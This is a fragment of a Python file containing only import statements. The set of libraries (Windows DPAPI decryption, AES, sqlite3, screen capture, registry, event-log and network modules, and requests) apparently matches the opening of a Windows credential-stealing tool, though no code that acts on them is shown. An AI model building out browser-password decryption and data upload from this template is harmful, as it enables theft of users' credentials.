import base64
import json
import os
import shutil
import sqlite3
import zipfile
import requests
import re
import logging
import threading
import platform
import psutil
import winreg
import win32evtlog
import win32net
import subprocess

from datetime import datetime, timezone, timedelta
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime, timedelta
from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData
from PIL import ImageGrab
from urllib.request import urlopen, Request